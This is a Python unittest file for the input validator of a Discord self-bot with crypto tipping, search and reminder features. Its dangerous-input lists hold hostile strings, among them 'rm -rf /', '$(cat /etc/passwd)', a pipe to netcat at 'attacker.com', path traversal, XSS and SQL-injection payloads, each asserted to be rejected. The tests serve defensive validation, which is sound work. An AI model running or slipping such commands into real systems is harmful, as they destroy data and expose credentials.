"""
Security Tests for JakeySelfBot
Tests input validation and security measures across all components
"""

import unittest
import sys
from pathlib import Path

# Add the project root to the path
sys.path.insert(0, str(Path(__file__).parent.parent))

from utils.security_validator import SecurityValidator, validator


class TestSecurityValidator(unittest.TestCase):
    """Test the security validation framework"""
    
    def setUp(self):
        self.validator = SecurityValidator()
    
    def test_validate_string_safe_inputs(self):
        """Test that safe strings pass validation"""
        safe_strings = [
            "hello world",
            "Bitcoin price",
            "User123",
            "Hello, how are you?",
            "This is a test message",
            "Check BTC price",
            "Search for information"
        ]
        
        for test_string in safe_strings:
            is_valid, error = self.validator.validate_string(test_string)
            self.assertTrue(is_valid, f"Safe string failed validation: {test_string}")
            self.assertEqual(error, "")
    
    def test_validate_string_dangerous_inputs(self):
        """Test that dangerous strings are rejected"""
        dangerous_strings = [
            "rm -rf /",           # Dangerous command
            "$(cat /etc/passwd)", # Command substitution
            "`whoami`",           # Command execution
            "cat /etc/passwd",    # File reading
            "&& echo hacked",     # Command chaining
            "; rm -rf /",         # Command separation
            "| nc attacker.com 4444", # Pipe to netcat
            "../../etc/passwd",   # Directory traversal
            "\x00malicious",      # Null byte injection
            "javascript:alert('xss')", # XSS attempt
        ]
        
        for dangerous_string in dangerous_strings:
            is_valid, error = self.validator.validate_string(dangerous_string)
            self.assertFalse(is_valid, f"Dangerous string passed validation: {dangerous_string}")
            self.assertNotEqual(error, "")
    
    def test_validate_discord_id_safe(self):
        """Test valid Discord IDs"""
        valid_ids = [
            "123456789012345678",
            "987654321098765432",
            "<@123456789012345678>",
            "<@!123456789012345678>",
            "<#123456789012345678>"
        ]
        
        for discord_id in valid_ids:
            is_valid, error = self.validator.validate_discord_id(discord_id)
            self.assertTrue(is_valid, f"Valid Discord ID failed: {discord_id}")
    
    def test_validate_discord_id_invalid(self):
        """Test invalid Discord IDs"""
        invalid_ids = [
            "not_a_number",
            "123",
            "12345678901234567890",  # Too long
            "",
            "abc123def456",
            "<@invalid>",
            "<@>",
            "12345-67890"
        ]
        
        for discord_id in invalid_ids:
            is_valid, error = self.validator.validate_discord_id(discord_id)
            self.assertFalse(is_valid, f"Invalid Discord ID passed: {discord_id}")
    
    def test_validate_crypto_symbol_safe(self):
        """Test valid crypto symbols"""
        valid_symbols = [
            "BTC",
            "ETH",
            "DOGE",
            "USDT",
            "ADA",
            "DOT",
            "LINK",
            "UNI"
        ]
        
        for symbol in valid_symbols:
            is_valid, error = self.validator.validate_crypto_symbol(symbol)
            self.assertTrue(is_valid, f"Valid crypto symbol failed: {symbol}")
    
    def test_validate_crypto_symbol_invalid(self):
        """Test invalid crypto symbols"""
        invalid_symbols = [
            "BTC@USDT",
            "BTC;rm -rf /",
            "BTC|cat /etc/passwd",
            "BTC$(whoami)",
            "BTC`ls -la`",
            "toolongcrypto",
            "BTC!",
            "BTC#",
            ""
        ]
        
        for symbol in invalid_symbols:
            is_valid, error = self.validator.validate_crypto_symbol(symbol)
            self.assertFalse(is_valid, f"Invalid crypto symbol passed: {symbol}")
    
    def test_validate_currency_code_safe(self):
        """Test valid currency codes"""
        valid_codes = [
            "USD",
            "EUR",
            "GBP",
            "JPY",
            "AUD",
            "CAD"
        ]
        
        for code in valid_codes:
            is_valid, error = self.validator.validate_currency_code(code)
            self.assertTrue(is_valid, f"Valid currency code failed: {code}")
    
    def test_validate_currency_code_invalid(self):
        """Test invalid currency codes"""
        invalid_codes = [
            "US",      # Too short
            "USDD",    # Too long
            "USD!",    # Invalid character
            "usd",     # Lowercase (should fail validation)
            "U$D",     # Special character
            "USD;",    # Command separator
            ""
        ]
        
        for code in invalid_codes:
            is_valid, error = self.validator.validate_currency_code(code)
            self.assertFalse(is_valid, f"Invalid currency code passed: {code}")
    
    def test_validate_search_query_safe(self):
        """Test valid search queries"""
        valid_queries = [
            "Bitcoin price today",
            "Weather in New York",
            "Python programming tutorial",
            "Latest news about AI",
            "How to cook pasta"
        ]
        
        for query in valid_queries:
            is_valid, error = self.validator.validate_search_query(query)
            self.assertTrue(is_valid, f"Valid search query failed: {query}")
    
    def test_validate_search_query_invalid(self):
        """Test invalid search queries"""
        invalid_queries = [
            "file:///etc/passwd",
            "rm -rf / directory",
            "$(cat /etc/shadow)",
            "javascript:alert(1)",
            "ftp://malicious.com",
            "ssh://attacker.com"
        ]
        
        for query in invalid_queries:
            is_valid, error = self.validator.validate_search_query(query)
            self.assertFalse(is_valid, f"Invalid search query passed: {query}")
    
    def test_validate_url_safe(self):
        """Test valid URLs"""
        valid_urls = [
            "https://www.google.com",
            "https://api.coinbase.com/v2/exchange-rates",
            "https://example.com/path/to/resource",
            "http://example.com"
        ]
        
        for url in valid_urls:
            is_valid, error = self.validator.validate_url(url)
            self.assertTrue(is_valid, f"Valid URL failed: {url}")
    
    def test_validate_url_invalid(self):
        """Test invalid URLs"""
        invalid_urls = [
            "file:///etc/passwd",
            "ftp://malicious.com",
            "http://localhost:8080",
            "https://127.0.0.1/admin",
            "javascript:alert('xss')",
            "not-a-url"
        ]
        
        for url in invalid_urls:
            is_valid, error = self.validator.validate_url(url)
            self.assertFalse(is_valid, f"Invalid URL passed: {url}")
    
    def test_validate_amount_safe(self):
        """Test valid amounts"""
        valid_amounts = [
            "100",
            "50.5",
            "0.001",
            "1000.12345678",
            "all"  # Special case
        ]
        
        for amount in valid_amounts:
            is_valid, error = self.validator.validate_amount(amount)
            self.assertTrue(is_valid, f"Valid amount failed: {amount}")
    
    def test_validate_amount_invalid(self):
        """Test invalid amounts"""
        invalid_amounts = [
            "-100",      # Negative
            "abc",       # Not numeric
            "100.1000000001",  # Too many decimal places
            "1000000001", # Too large
            "",
            "  ",
            "100;rm -rf /"
        ]
        
        for amount in invalid_amounts:
            is_valid, error = self.validator.validate_amount(amount)
            self.assertFalse(is_valid, f"Invalid amount passed: {amount}")
    
    def test_validate_discord_message_safe(self):
        """Test valid Discord messages"""
        valid_messages = [
            "Hello everyone!",
            "Check out this link: https://example.com",
            "Thanks for the help!",
            "I agree with you",
            "Good morning! ☀️"
        ]
        
        for message in valid_messages:
            is_valid, error = self.validator.validate_discord_message(message)
            self.assertTrue(is_valid, f"Valid Discord message failed: {message}")
    
    def test_validate_discord_message_invalid(self):
        """Test invalid Discord messages"""
        invalid_messages = [
            "@everyone listen to me!",
            "@here important announcement",
            "Click this: javascript:alert(1)",
            "$(rm -rf /)",
            "Message with null byte \x00"
        ]
        
        for message in invalid_messages:
            is_valid, error = self.validator.validate_discord_message(message)
            self.assertFalse(is_valid, f"Invalid Discord message passed: {message}")
    
    def test_validate_tip_command_safe(self):
        """Test valid tip commands"""
        valid_tips = [
            ("<@123456789012345678>", "100", "DOGE", "Thanks for the help!"),
            ("<@987654321098765432>", "all", "BTC", ""),
            ("123456789012345678", "50.5", "ETH", "Payment for services")
        ]
        
        for recipient, amount, currency, message in valid_tips:
            is_valid, error = self.validator.validate_tip_command(recipient, amount, currency, message)
            self.assertTrue(is_valid, f"Valid tip command failed: {recipient}, {amount}, {currency}")
    
    def test_validate_tip_command_invalid(self):
        """Test invalid tip commands"""
        invalid_tips = [
            ("invalid_user", "100", "DOGE", ""),  # Invalid recipient
            ("<@123>", "100", "DOGE", ""),       # Invalid Discord ID
            ("<@123456789012345678>", "-100", "DOGE", ""),  # Negative amount
            ("<@123456789012345678>", "abc", "DOGE", ""),   # Invalid amount
            ("<@123456789012345678>", "100", "INVALID", ""), # Invalid currency
            ("<@123456789012345678>", "100", "DOGE", "@everyone"),  # Dangerous message
        ]
        
        for recipient, amount, currency, message in invalid_tips:
            is_valid, error = self.validator.validate_tip_command(recipient, amount, currency, message)
            self.assertFalse(is_valid, f"Invalid tip command passed: {recipient}, {amount}, {currency}")
    
    def test_validate_reminder_data_safe(self):
        """Test valid reminder data"""
        valid_reminders = [
            ("Meeting", "Team meeting at 3 PM", "2025-12-01T15:00:00Z"),
            ("Birthday", "John's birthday", "2025-12-25T00:00:00Z"),
            ("Take medicine", "Take daily medication", "2025-11-13T08:00:00Z")
        ]
        
        for title, description, trigger_time in valid_reminders:
            is_valid, error = self.validator.validate_reminder_data(title, description, trigger_time)
            self.assertTrue(is_valid, f"Valid reminder data failed: {title}")
    
    def test_validate_reminder_data_invalid(self):
        """Test invalid reminder data"""
        invalid_reminders = [
            ("", "Empty title", "2025-12-01T15:00:00Z"),  # Empty title
            ("Meeting", "", "2025-12-01T15:00:00Z"),      # Empty description
            ("Meeting", "Desc", "invalid-time"),           # Invalid time format
            ("$(rm -rf /)", "Malicious", "2025-12-01T15:00:00Z"),  # Dangerous title
            ("Meeting", "cat /etc/passwd", "2025-12-01T15:00:00Z"), # Dangerous description
        ]
        
        for title, description, trigger_time in invalid_reminders:
            is_valid, error = self.validator.validate_reminder_data(title, description, trigger_time)
            self.assertFalse(is_valid, f"Invalid reminder data passed: {title}")
    
    def test_sanitize_html(self):
        """Test HTML sanitization"""
        dangerous_html = "<script>alert('xss')</script>Hello <b>world</b>"
        sanitized = self.validator.sanitize_html(dangerous_html)
        
        # Script tag should be removed
        self.assertNotIn("<script>", sanitized)
        self.assertNotIn("</script>", sanitized)
        
        # Safe HTML should remain
        self.assertIn("Hello", sanitized)
        self.assertIn("world", sanitized)
    
    def test_sanitize_filename(self):
        """Test filename sanitization"""
        dangerous_filenames = [
            "../../../etc/passwd",
            "file with spaces.txt",
            "file:with*special?chars.txt",
            ".hidden",
            "   leading spaces.txt"
        ]
        
        for filename in dangerous_filenames:
            sanitized = self.validator.sanitize_filename(filename)
            # Should not contain path separators
            self.assertNotIn("/", sanitized)
            self.assertNotIn("\\", sanitized)
            # Should not be empty
            self.assertNotEqual(sanitized, "")


class TestToolManagerSecurity(unittest.TestCase):
    """Test security in tool manager"""
    
    def setUp(self):
        try:
            from tools.tool_manager import ToolManager
            self.tool_manager = ToolManager()
        except ImportError:
            self.skipTest("ToolManager not available")
    
    def test_crypto_price_validation(self):
        """Test crypto price validation"""
        # Valid symbols should work
        valid_symbols = ["BTC", "ETH", "DOGE"]
        for symbol in valid_symbols:
            result = self.tool_manager.get_crypto_price(symbol)
            # Should not return validation error
            self.assertNotIn("Invalid cryptocurrency symbol", result)
        
        # Invalid symbols should be rejected
        invalid_symbols = ["BTC;rm -rf /", "BTC$(whoami)", "invalid!symbol"]
        for symbol in invalid_symbols:
            result = self.tool_manager.get_crypto_price(symbol)
            self.assertIn("Invalid cryptocurrency symbol", result)
    
    def test_search_validation(self):
        """Test search query validation"""
        # Valid queries should work
        valid_queries = ["Bitcoin price", "Weather forecast"]
        for query in valid_queries:
            result = self.tool_manager.web_search(query)
            # Should not return validation error
            self.assertNotIn("Invalid search query", result)
        
        # Invalid queries should be rejected
        invalid_queries = ["$(cat /etc/passwd)", "rm -rf /", "file:///etc/passwd"]
        for query in invalid_queries:
            result = self.tool_manager.web_search(query)
            self.assertIn("Invalid search query", result)


class TestDiscordToolsSecurity(unittest.TestCase):
    """Test security in Discord tools"""
    
    def setUp(self):
        try:
            from tools.discord_tools import DiscordTools
            # Mock bot client for testing
            class MockBot:
                pass
            self.discord_tools = DiscordTools(MockBot())
        except ImportError:
            self.skipTest("DiscordTools not available")
    
    def test_channel_id_parsing(self):
        """Test channel ID parsing with validation"""
        # Valid IDs
        valid_ids = ["123456789012345678", "<#123456789012345678>"]
        for channel_id in valid_ids:
            result = self.discord_tools._parse_channel_id(channel_id)
            self.assertIsNotNone(result)
            self.assertEqual(result, 123456789012345678)
        
        # Invalid IDs
        invalid_ids = ["invalid", "123", "<#invalid>", ""]
        for channel_id in invalid_ids:
            result = self.discord_tools._parse_channel_id(channel_id)
            self.assertIsNone(result)


class TestDatabaseSecurity(unittest.TestCase):
    """Test database security measures"""
    
    def setUp(self):
        try:
            from data.database import DatabaseManager
            # Use in-memory database for testing
            import tempfile
            import os
            
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
            temp_db.close()
            
            # Temporarily override DATABASE_PATH
            original_db_path = None
            try:
                import config
                original_db_path = config.DATABASE_PATH
                config.DATABASE_PATH = temp_db.name
                self.db = DatabaseManager()
                self.temp_db_path = temp_db.name
            except ImportError:
                self.skipTest("Config not available")
        except ImportError:
            self.skipTest("DatabaseManager not available")
    
    def tearDown(self):
        """Clean up test database"""
        if hasattr(self, 'temp_db_path') and self.temp_db_path:
            try:
                import os
                os.unlink(self.temp_db_path)
            except:
                pass
    
    def test_user_id_validation(self):
        """Test user ID validation in database operations"""
        # Valid user ID
        valid_user_id = "123456789012345678"
        result = self.db.get_user(valid_user_id)
        self.assertIsNone(result)  # Should return None for non-existent user, not crash
        
        # Invalid user IDs
        invalid_user_ids = [
            "invalid",
            "123; DROP TABLE users; --",
            "' OR '1'='1",
            "",
            None
        ]
        
        for invalid_id in invalid_user_ids:
            result = self.db.get_user(invalid_id)
            self.assertIsNone(result)  # Should return None, not crash


if __name__ == '__main__':
    unittest.main()